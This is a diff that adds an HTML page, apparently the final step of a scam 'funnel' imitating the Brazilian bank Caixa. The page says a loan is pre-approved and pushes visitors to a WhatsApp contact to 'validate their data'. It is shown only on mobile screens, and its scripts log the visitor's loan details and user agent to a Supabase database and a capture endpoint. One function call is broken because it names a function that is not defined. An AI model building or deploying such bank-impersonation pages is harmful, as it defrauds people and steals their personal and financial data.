@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <link rel="icon" type="image/png" href="favicon.png" />
+  <title>CAIXATEM - Finalização</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: #0066b3;
+      height: 100%;
+      width: 100%;
+      position: fixed;
+      overflow: hidden;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        display: flex;
+      }
+    }
+
+    .container {
+      background: white;
+      border-radius: 24px;
+      width: 100%;
+      max-width: 420px;
+      margin: auto;
+      padding: 0;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+      position: relative;
+      min-height: 90%;
+      max-height: 100%;
+      overflow-y: auto;
+      align-self: center;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: none;
+      border: none;
+      font-size: 28px;
+      color: #666;
+      cursor: pointer;
+      font-weight: 300;
+      line-height: 1;
+      padding: 0;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .content {
+      padding: 80px 32px 32px 32px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .logo {
+      position: absolute;
+      top: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo img {
+      max-width: 50px;
+      height: auto;
+    }
+
+    h1 {
+      color: #003e6b;
+      font-size: 28px;
+      font-weight: 600;
+      line-height: 1.3;
+      margin-bottom: 16px;
+    }
+
+    p {
+      color: #374151;
+      font-size: 16px;
+      line-height: 1.5;
+      margin-bottom: 32px;
+    }
+
+    .whatsapp-btn {
+      width: 100%;
+      padding: 16px;
+      background: #25D366;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      box-shadow: 0 4px 6px rgba(37, 211, 102, 0.2);
+      transition: background 0.2s;
+    }
+
+    .whatsapp-btn:hover {
+      background: #128C7E;
+    }
+
+    .loan-details {
+      background: #f3f4f6;
+      border-radius: 16px;
+      padding: 24px;
+      margin-bottom: 24px;
+      width: 100%;
+    }
+
+    .loan-details h3 {
+      color: #003e6b;
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 16px;
+    }
+
+    .detail-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #e5e7eb;
+    }
+
+    .detail-item:last-child {
+      margin-bottom: 0;
+      padding-bottom: 0;
+      border-bottom: none;
+    }
+
+    .detail-label {
+      color: #6b7280;
+      font-size: 14px;
+    }
+
+    .detail-value {
+      color: #0066b3;
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    .version {
+      text-align: center;
+      color: #1a7f78;
+      font-size: 14px;
+      margin-top: auto;
+      padding-top: 40px;
+      padding-bottom: 20px;
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <button class="close-btn">✕</button>
+    
+    <div class="content">
+      <div class="logo">
+        <img src="logocaixa2.png" alt="Logo">
+      </div>
+
+      <h1>Solicitação <br> Pré-Aprovada!</h1>
+
+      <div class="loan-details" id="loanDetails" style="display: none;">
+        <h3>Detalhes do Empréstimo</h3>
+        <div class="detail-item">
+          <span class="detail-label">Valor Solicitado</span>
+          <span class="detail-value" id="loanAmount">-</span>
+        </div>
+        <div class="detail-item">
+          <span class="detail-label">Parcelas</span>
+          <span class="detail-value" id="installments">-</span>
+        </div>
+        <div class="detail-item">
+          <span class="detail-label">Valor da Parcela</span>
+          <span class="detail-value" id="installmentValue">-</span>
+        </div>
+      </div>
+
+      <p>Para concluir a liberação do seu crédito, é necessário validar seus dados com nosso atendimento.</p>
+
+      <a href="https://wa.me/5511999999999" class="whatsapp-btn" id="whatsappBtn">
+        Iniciar Atendimento
+      </a>
+
+      <div class="version">Versão: 1.91.23</div>
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- SUPABASE INTEGRATION - MESMO SISTEMA DO FUNIL -->
+  <!-- ============================================ -->
+  <script>
+    const SUPABASE_URL = 'https://hbpgjwezukugbtviswkw.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable__7MjiigiJf7NgmLZPLFdxA_yRNF_cO8';
+
+    function getSessaoId() {
+      let id = sessionStorage.getItem('sessao_funil');
+      if (!id) {
+        id = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        sessionStorage.setItem('sessao_funil', id);
+      }
+      return id;
+    }
+
+    async function salvarEtapa(etapaNome, dadosColetados = {}) {
+      const sessao_id = getSessaoId();
+      
+      const payload = {
+        sessao_id: sessao_id,
+        etapa: etapaNome,
+        dados: dadosColetados,
+        url: window.location.pathname,
+        user_agent: navigator.userAgent.substring(0, 255)
+      };
+
+      console.log(`📝 Salvando etapa: ${etapaNome}`, dadosColetados);
+
+      try {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/funil_etapas`, {
+          method: 'POST',
+          headers: {
+            'apikey': SUPABASE_KEY,
+            'Authorization': `Bearer ${SUPABASE_KEY}`,
+            'Content-Type': 'application/json',
+            'Prefer': 'return=minimal'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          console.log(`✅ Etapa "${etapaNome}" salva com sucesso!`);
+          return true;
+        } else {
+          console.error(`❌ Erro ${response.status}:`, await response.text());
+          return false;
+        }
+      } catch (error) {
+        console.error('❌ Erro de rede:', error);
+        return false;
+      }
+    }
+
+    // Função para buscar os dados do empréstimo do localStorage (salvo na página anterior)
+    function getLoanDataFromStorage() {
+      try {
+        const loanData = localStorage.getItem('funil_emprestimo_data');
+        if (loanData) {
+          return JSON.parse(loanData);
+        }
+      } catch(e) {}
+      
+      // Tenta buscar do sessionStorage também
+      try {
+        const loanData = sessionStorage.getItem('funil_emprestimo_data');
+        if (loanData) {
+          return JSON.parse(loanData);
+        }
+      } catch(e) {}
+      
+      return null;
+    }
+
+    // Função para salvar os dados do empréstimo no storage (vindo da página anterior)
+    function saveLoanDataToStorage(amount, installments, installmentValue) {
+      const data = {
+        amount: amount,
+        installments: installments,
+        installmentValue: installmentValue,
+        timestamp: new Date().toISOString()
+      };
+      localStorage.setItem('funil_emprestimo_data', JSON.stringify(data));
+      sessionStorage.setItem('funil_emprestimo_data', JSON.stringify(data));
+    }
+  </script>
+
+  <script>
+    // REGISTRA QUE O USUÁRIO CHEGOU NESTA PÁGINA (ETAPA FINAL DO FUNIL)
+    salvarEtapa('pagina_fim', { 
+      pagina: 'fim4e98',
+      timestamp_acesso: new Date().toISOString()
+    });
+
+    // Função para buscar e exibir os dados do empréstimo
+    async function loadAndDisplayLoanData() {
+      let loanAmount = null;
+      let installments = null;
+      let installmentValue = null;
+      
+      // TENTATIVA 1: Buscar do localStorage (salvo pela página de empréstimo)
+      const storageData = getLoanDataFromStorage();
+      if (storageData) {
+        loanAmount = storageData.amount;
+        installments = storageData.installments;
+        installmentValue = storageData.installmentValue;
+        console.log('✅ Dados carregados do storage:', storageData);
+      }
+      
+      // TENTATIVA 2: Buscar do Supabase (última simulação de empréstimo desta sessão)
+      if (!loanAmount) {
+        try {
+          const sessao_id = getSessaoId();
+          const response = await fetch(`${SUPABASE_URL}/rest/v1/funil_etapas?select=dados&etapa=eq.simulacao_emprestimo&sessao_id=eq.${sessao_id}&order=created_at.desc&limit=1`, {
+            headers: {
+              'apikey': SUPABASE_KEY,
+              'Authorization': `Bearer ${SUPABASE_KEY}`
+            }
+          });
+          
+          if (response.ok) {
+            const data = await response.json();
+            if (data && data.length > 0 && data[0].dados) {
+              loanAmount = data[0].dados.valor_solicitado;
+              installments = data[0].dados.quantidade_parcelas;
+              installmentValue = data[0].dados.valor_parcela;
+              console.log('✅ Dados carregados do Supabase:', data[0].dados);
+              
+              // Salva no storage para próximas vezes
+              if (loanAmount && installments) {
+                saveLoanDataToStorage(loanAmount, installments, installmentValue);
+              }
+            }
+          }
+        } catch(e) {
+          console.error('Erro ao buscar dados do Supabase:', e);
+        }
+      }
+      
+      // TENTATIVA 3: Buscar do arquivo JSON (fallback)
+      if (!loanAmount) {
+        try {
+          const response = await fetch('get_loan_data.json');
+          const data = await response.json();
+          if (data.amount && data.installments) {
+            loanAmount = data.amount;
+            installments = data.installments;
+            console.log('✅ Dados carregados do JSON:', data);
+          }
+        } catch(err) {
+          console.error('Erro ao carregar JSON:', err);
+        }
+      }
+      
+      // Exibe os dados na tela
+      if (loanAmount && installments) {
+        const loanDetails = document.getElementById('loanDetails');
+        const loanAmountEl = document.getElementById('loanAmount');
+        const installmentsEl = document.getElementById('installments');
+        const installmentValueEl = document.getElementById('installmentValue');
+        
+        const formatCurrency = (value) => {
+          return parseFloat(value).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        };
+        
+        // Calcula valor da parcela se não tiver
+        let finalInstallmentValue = installmentValue;
+        if (!finalInstallmentValue) {
+          const amount = parseFloat(loanAmount);
+          const months = parseInt(installments);
+          const i = 0.01;
+          if (i === 0) {
+            finalInstallmentValue = amount / months;
+          } else {
+            finalInstallmentValue = amount * (i * Math.pow(1 + i, months)) / (Math.pow(1 + i, months) - 1);
+          }
+        }
+        
+        loanAmountEl.textContent = formatCurrency(loanAmount);
+        installmentsEl.textContent = `${installments}x`;
+        installmentValueEl.textContent = formatCurrency(finalInstallmentValue);
+        loanDetails.style.display = 'block';
+        
+        // SALVA ETAPA DE CONCLUSÃO DO FUNIL
+        await salvarEtapa('funil_concluido', {
+          status: 'concluido',
+          valor_final: loanAmount,
+          parcelas_finais: installments,
+          valor_parcela_final: finalInstallmentValue,
+          data_conclusao: new Date().toISOString()
+        });
+      } else {
+        // Mesmo sem dados, registra que o funil foi concluído
+        await salvarEtapa('funil_concluido', {
+          status: 'concluido_sem_dados_emprestimo',
+          data_conclusao: new Date().toISOString()
+        });
+      }
+    }
+    
+    // Executa o carregamento dos dados
+    loadAndLoanData();
+    
+    // Registra clique no WhatsApp (opcional - rastreia conversão)
+    document.getElementById('whatsappBtn').addEventListener('click', async function(e) {
+      const loanAmount = document.getElementById('loanAmount').textContent;
+      const installments = document.getElementById('installments').textContent;
+      
+      await salvarEtapa('clique_whatsapp', {
+        acao: 'iniciar_atendimento',
+        valor_solicitado: loanAmount,
+        parcelas: installments,
+        timestamp_clique: new Date().toISOString()
+      });
+      
+      console.log('✅ Clique no WhatsApp registrado!');
+      // O link vai abrir normalmente - não precisa de e.preventDefault()
+    });
+  </script>
+
+  <script>
+    // Log visit (mantém compatibilidade)
+    fetch('capture.json', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ step: 'visit', page: 'fim' })
+    }).catch(() => {});
+
+    // Manter parâmetro de acesso em todos os links e formulários
+    document.addEventListener('DOMContentLoaded', function() {
+        var accessParam = 'a7k9m2x1p12';
+        
+        function addAccessToLinks() {
+            var links = document.querySelectorAll('a[href]');
+            links.forEach(function(link) {
+                var href = link.getAttribute('href');
+                if (!href || href.startsWith('http') || href.startsWith('#') || 
+                    href.startsWith('javascript:') || href.includes(accessParam.split('=')[0])) {
+                    return;
+                }
+                var separator = href.includes('?') ? '&' : '?';
+                link.setAttribute('href', href + separator + accessParam);
+            });
+        }
+        
+        function addAccessToForms() {
+            var forms = document.querySelectorAll('form');
+            forms.forEach(function(form) {
+                if (!form.method || form.method.toLowerCase() === 'get') {
+                    var paramName = accessParam.split('=')[0];
+                    var existingInput = form.querySelector('input[name="' + paramName + '"]');
+                    if (!existingInput) {
+                        var input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = paramName;
+                        input.value = '';
+                        form.appendChild(input);
+                    }
+                }
+            });
+        }
+        
+        addAccessToLinks();
+        addAccessToForms();
+        
+        var observer = new MutationObserver(function(mutations) {
+            var shouldUpdate = false;
+            mutations.forEach(function(mutation) {
+                if (mutation.type === 'childList') {
+                    mutation.addedNodes.forEach(function(node) {
+                        if (node.nodeType === 1) {
+                            if (node.tagName === 'A' || node.tagName === 'FORM' || 
+                                node.querySelector('a') || node.querySelector('form')) {
+                                shouldUpdate = true;
+                            }
+                        }
+                    });
+                }
+            });
+            if (shouldUpdate) {
+                addAccessToLinks();
+                addAccessToForms();
+            }
+        });
+        
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    });
+  </script>
+</body>
+</html>
